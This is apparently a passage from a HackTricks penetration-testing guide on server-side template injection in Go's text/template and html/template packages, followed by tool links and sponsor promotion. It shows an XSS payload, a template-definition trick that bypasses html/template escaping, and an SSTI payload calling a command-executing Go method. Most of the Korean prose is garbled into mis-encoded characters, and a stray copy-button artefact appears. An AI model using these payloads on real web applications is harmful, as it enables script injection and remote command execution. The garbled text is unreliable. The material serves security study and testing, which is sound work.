`text/template` íŒ¨í‚¤ì§€ë¥¼ ì‚¬ìš©í•˜ë©´ í˜ì´ë¡œë“œë¥¼ ì§ì ‘ ì‚½ì…í•˜ì—¬ XSSë¥¼ ê°„ë‹¨í•˜ê²Œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°˜ë©´, `html/template` íŒ¨í‚¤ì§€ëŠ” ì‘ë‹µì„ ì¸ì½”ë”©í•˜ì—¬ ì´ë¥¼ ë°©ì§€í•©ë‹ˆë‹¤ (ì˜ˆ: `{{"<script>alert(1)</script>"}}`ëŠ” `&lt;script&gt;alert(1)&lt;/script&gt;`ë¡œ ê²°ê³¼ê°€ ë‚˜ì˜µë‹ˆë‹¤). ê·¸ëŸ¬ë‚˜ Goì—ì„œì˜ í…œí”Œë¦¿ ì •ì˜ì™€ í˜¸ì¶œì€ ì´ ì¸ì½”ë”©ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}

vbnet
Copy code

**RCE Exploitation**

`html/template`ê³¼ `text/template` ê°„ì— RCE(exploitation)ëŠ” í¬ê²Œ ë‹¤ë¦…ë‹ˆë‹¤. `text/template` ëª¨ë“ˆì€ ì–´ë–¤ ê³µê°œ í•¨ìˆ˜ë“  ì§ì ‘ í˜¸ì¶œí•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•˜ì§€ë§Œ(`call` ê°’ì„ ì‚¬ìš©), `html/template`ì—ì„œëŠ” í—ˆìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ëª¨ë“ˆì— ëŒ€í•œ ë¬¸ì„œëŠ” [ì—¬ê¸°(html/template)](https://golang.org/pkg/html/template/)ì™€ [ì—¬ê¸°(text/template)](https://golang.org/pkg/text/template/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Goì—ì„œ SSTIë¥¼ í†µí•œ RCE(exploitation)ë¥¼ ìœ„í•´ ê°ì²´ ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì œê³µëœ ê°ì²´ì— `System` ë©”ì„œë“œê°€ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ê²½ìš°, `{{ .System "ls" }}`ì™€ ê°™ì´ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì†ŒìŠ¤ ì½”ë“œì— ì ‘ê·¼í•´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆì‹œì—ì„œì™€ ê°™ì´ìš”.
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**ì¶”ê°€ ì •ë³´**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### ë” ë§ì€ Exploits

ë” ë§ì€ exploitsì€ [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)ì—ì„œ í¥ë¯¸ë¡œìš´ íƒœê·¸ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## ê´€ë ¨ ë„ì›€ë§

ìœ ìš©í•  ê²ƒìœ¼ë¡œ ìƒê°ë˜ë©´ ë‹¤ìŒì„ ì½ì–´ë³´ì„¸ìš”:

* [Flask íŠ¸ë¦­](../../network-services-pentesting/pentesting-web/flask.md)
* [Python ë§¤ì§ í•¨ìˆ˜](broken-reference/)

## ë„êµ¬

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## ë¸Œë£¨íŠ¸ í¬ìŠ¤ íƒì§€ ëª©ë¡

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## ì—°ìŠµ ë° ì°¸ê³  ìë£Œ

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„± ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ í–‰ì‚¬ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ ì ì¸ ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë¯¸ì…˜**ì„ ê°€ì§€ê³  ìˆëŠ” ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì—ê²Œ ì—´ì •ì ì¸ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê±°ë‚˜ **íšŒì‚¬ë¥¼ ê´‘ê³ **í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family)ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
